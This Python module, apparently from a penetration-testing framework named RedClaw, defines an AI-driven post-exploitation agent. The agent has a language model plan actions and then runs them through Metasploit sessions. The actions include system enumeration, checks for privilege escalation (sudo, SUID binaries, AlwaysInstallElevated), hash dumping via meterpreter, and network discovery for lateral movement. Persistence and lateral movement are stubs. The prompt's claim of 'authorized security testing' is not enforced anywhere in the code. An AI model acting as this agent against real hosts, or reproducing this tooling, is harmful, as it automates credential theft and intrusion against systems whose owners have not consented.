"""
RedClaw Agents - Post-Exploitation Agent
Specialized agent for post-exploitation activities
"""

from typing import Dict, List, Optional, Any
from dataclasses import dataclass, field
from datetime import datetime

from .base import BaseAgent, AgentCapability, AgentResult
from ..core.llm_client import RedClawLLM, Message


@dataclass
class CollectedData:
    """Collected data from target"""
    data_type: str  # credentials, files, network, system
    content: Any
    source: str
    timestamp: datetime = field(default_factory=datetime.now)


class PostExploitAgent(BaseAgent):
    """
    Post-Exploitation Agent
    
    Specializes in:
    - Privilege escalation
    - Credential harvesting
    - Lateral movement
    - Data exfiltration
    - Persistence establishment
    """
    
    POSTEXPLOIT_PROMPT = """You are a post-exploitation specialist conducting authorized security testing.

Session: {session}
Platform: {platform}
Current privileges: {privileges}
Objective: {objective}

Available capabilities:
{tools}

Plan post-exploitation activities:
1. Enumerate system
2. Escalate privileges if needed
3. Harvest credentials
4. Identify lateral movement paths
5. Collect evidence

Output a JSON plan:
{{
    "reasoning": "your analysis",
    "steps": [
        {{"action": "action_name", "args": {{}}, "purpose": "why"}}
    ],
    "priority_targets": ["target1", "target2"],
    "risk_assessment": "low|medium|high"
}}"""

    def __init__(
        self,
        llm: RedClawLLM,
        msf_client = None,
        **kwargs
    ):
        super().__init__(
            name="PostExploitAgent",
            description="Post-exploitation and lateral movement specialist",
            llm=llm,
            capabilities=[
                AgentCapability.POST_EXPLOIT,
                AgentCapability.PERSIST
            ],
            **kwargs
        )
        
        self.msf_client = msf_client
        self.collected_data: List[CollectedData] = []
        
        self._register_postexploit_tools()
    
    def _register_postexploit_tools(self):
        """Register post-exploitation tools"""
        
        self.register_tool(
            "system_enum",
            self._system_enum,
            "Enumerate system information"
        )
        
        self.register_tool(
            "privesc_check",
            self._privesc_check,
            "Check privilege escalation vectors"
        )
        
        self.register_tool(
            "cred_harvest",
            self._cred_harvest,
            "Harvest credentials from system"
        )
        
        self.register_tool(
            "network_enum",
            self._network_enum,
            "Enumerate network connections"
        )
        
        self.register_tool(
            "establish_persistence",
            self._establish_persistence,
            "Establish persistence mechanism"
        )
        
        self.register_tool(
            "lateral_move",
            self._lateral_move,
            "Attempt lateral movement"
        )
    
    async def execute(
        self,
        session_id: int,
        platform: str = "unknown",
        objectives: List[str] = None
    ) -> AgentResult:
        """Execute post-exploitation"""
        
        self.log(f"Starting post-exploitation on session {session_id}")
        
        objectives = objectives or ["enumerate", "escalate", "harvest"]
        
        # Get session info
        session_info = await self._get_session_info(session_id)
        
        # Create plan
        plan = await self._create_plan(session_info, objectives)
        
        results = []
        
        for step in plan.get("steps", []):
            action = step.get("action")
            args = step.get("args", {})
            
            if action in self.tools:
                try:
                    result = await self.execute_tool(
                        action,
                        session_id=session_id,
                        **args
                    )
                    results.append({
                        "action": action,
                        "purpose": step.get("purpose"),
                        "result": result
                    })
                except Exception as e:
                    results.append({
                        "action": action,
                        "error": str(e)
                    })
        
        return AgentResult(
            success=True,
            data={
                "session_id": session_id,
                "collected_data": [
                    {"type": d.data_type, "count": 1}
                    for d in self.collected_data
                ],
                "results": results
            },
            message=f"Post-exploitation complete. {len(self.collected_data)} items collected.",
            artifacts=results
        )
    
    async def _create_plan(
        self,
        session_info: Dict,
        objectives: List[str]
    ) -> Dict:
        """Create post-exploitation plan"""
        
        tools_desc = "\n".join([
            f"- {name}: {info['description']}"
            for name, info in self.tools.items()
        ])
        
        prompt = self.POSTEXPLOIT_PROMPT.format(
            session=str(session_info),
            platform=session_info.get("platform", "unknown"),
            privileges=session_info.get("privileges", "user"),
            objective=", ".join(objectives),
            tools=tools_desc
        )
        
        messages = [Message(role="user", content=prompt)]
        response = await self.llm.achat(messages, max_tokens=1024)
        
        return self._parse_plan(response.content)
    
    async def _get_session_info(self, session_id: int) -> Dict:
        """Get session information"""
        
        if self.msf_client:
            try:
                sessions = await self.msf_client.list_sessions()
                for s in sessions:
                    if s.session_id == session_id:
                        return {
                            "id": s.session_id,
                            "type": s.session_type,
                            "platform": s.platform,
                            "target": s.tunnel_peer,
                            "privileges": "unknown"
                        }
            except:
                pass
        
        return {
            "id": session_id,
            "type": "shell",
            "platform": "unknown",
            "privileges": "user"
        }
    
    # ============ Tool Implementations ============
    
    async def _system_enum(
        self,
        session_id: int,
        **kwargs
    ) -> Dict:
        """System enumeration"""
        
        commands = {
            "linux": [
                "uname -a",
                "id",
                "whoami",
                "cat /etc/passwd | head -20",
                "ps aux | head -20"
            ],
            "windows": [
                "systeminfo",
                "whoami /all",
                "net user",
                "tasklist"
            ]
        }
        
        if self.msf_client:
            try:
                # Determine platform
                result = await self.msf_client.session_shell(session_id, "uname -a")
                platform = "linux" if result else "windows"
                
                outputs = {}
                for cmd in commands.get(platform, commands["linux"])[:3]:
                    output = await self.msf_client.session_shell(session_id, cmd)
                    outputs[cmd] = output
                
                self.collected_data.append(CollectedData(
                    data_type="system",
                    content=outputs,
                    source=f"session_{session_id}"
                ))
                
                return {
                    "success": True,
                    "platform": platform,
                    "data": outputs
                }
            except Exception as e:
                return {"success": False, "error": str(e)}
        
        return {
            "success": False,
            "message": "No session manager available"
        }
    
    async def _privesc_check(
        self,
        session_id: int,
        **kwargs
    ) -> Dict:
        """Check privilege escalation vectors"""
        
        vectors = {
            "linux": [
                {"check": "sudo -l", "name": "sudo_rights"},
                {"check": "find / -perm -4000 2>/dev/null | head -10", "name": "suid_binaries"},
                {"check": "cat /etc/crontab", "name": "cron_jobs"},
            ],
            "windows": [
                {"check": "whoami /priv", "name": "privileges"},
                {"check": "reg query HKLM\\SOFTWARE\\Policies\\Microsoft\\Windows\\Installer /v AlwaysInstallElevated", "name": "always_install_elevated"},
            ]
        }
        
        if self.msf_client:
            try:
                results = {}
                for check in vectors["linux"][:2]:  # Quick checks
                    output = await self.msf_client.session_shell(
                        session_id, check["check"]
                    )
                    results[check["name"]] = output
                
                return {
                    "success": True,
                    "vectors": results,
                    "potential_escalations": self._analyze_privesc(results)
                }
            except Exception as e:
                return {"success": False, "error": str(e)}
        
        return {"success": False, "message": "No session manager"}
    
    async def _cred_harvest(
        self,
        session_id: int,
        **kwargs
    ) -> Dict:
        """Harvest credentials"""
        
        # Meterpreter hashdump or mimikatz
        if self.msf_client:
            try:
                # Try hashdump
                output = await self.msf_client.session_meterpreter(
                    session_id, "hashdump"
                )
                
                if output:
                    self.collected_data.append(CollectedData(
                        data_type="credentials",
                        content="[REDACTED - hashes collected]",
                        source=f"session_{session_id}"
                    ))
                    
                    return {
                        "success": True,
                        "type": "hash_dump",
                        "count": output.count("\n") + 1
                    }
            except:
                pass
        
        return {
            "success": False,
            "message": "Credential harvesting requires elevated session"
        }
    
    async def _network_enum(
        self,
        session_id: int,
        **kwargs
    ) -> Dict:
        """Network enumeration"""
        
        if self.msf_client:
            try:
                commands = [
                    "ip addr || ifconfig",
                    "netstat -an | head -30",
                    "cat /etc/hosts",
                    "arp -a"
                ]
                
                results = {}
                for cmd in commands[:2]:
                    output = await self.msf_client.session_shell(session_id, cmd)
                    results[cmd.split()[0]] = output
                
                self.collected_data.append(CollectedData(
                    data_type="network",
                    content=results,
                    source=f"session_{session_id}"
                ))
                
                return {
                    "success": True,
                    "data": results,
                    "hosts_found": self._parse_network_data(results)
                }
            except Exception as e:
                return {"success": False, "error": str(e)}
        
        return {"success": False, "message": "No session manager"}
    
    async def _establish_persistence(
        self,
        session_id: int,
        method: str = "ssh_key",
        **kwargs
    ) -> Dict:
        """Establish persistence"""
        
        methods = {
            "ssh_key": "Add SSH key to authorized_keys",
            "cron": "Add cron job",
            "service": "Create system service",
            "startup": "Add to startup scripts"
        }
        
        return {
            "success": False,
            "method": method,
            "description": methods.get(method, "Unknown"),
            "note": "Persistence requires manual implementation for safety"
        }
    
    async def _lateral_move(
        self,
        session_id: int,
        target: str = None,
        **kwargs
    ) -> Dict:
        """Attempt lateral movement"""
        
        return {
            "success": False,
            "target": target,
            "note": "Lateral movement requires explicit authorization"
        }
    
    def _analyze_privesc(self, results: Dict) -> List[str]:
        """Analyze privilege escalation opportunities"""
        
        opportunities = []
        
        sudo_output = results.get("sudo_rights", "")
        if "NOPASSWD" in sudo_output:
            opportunities.append("NOPASSWD sudo rights detected")
        if "(ALL)" in sudo_output:
            opportunities.append("Full sudo access possible")
        
        suid = results.get("suid_binaries", "")
        dangerous_suids = ["nmap", "vim", "find", "bash", "python"]
        for binary in dangerous_suids:
            if binary in suid:
                opportunities.append(f"Exploitable SUID: {binary}")
        
        return opportunities
    
    def _parse_network_data(self, data: Dict) -> List[str]:
        """Parse network data for hosts"""
        hosts = []
        
        for output in data.values():
            if not output:
                continue
            # Simple IP extraction
            import re
            ips = re.findall(r'\d+\.\d+\.\d+\.\d+', str(output))
            hosts.extend([ip for ip in ips if not ip.startswith("127.")])
        
        return list(set(hosts))[:10]
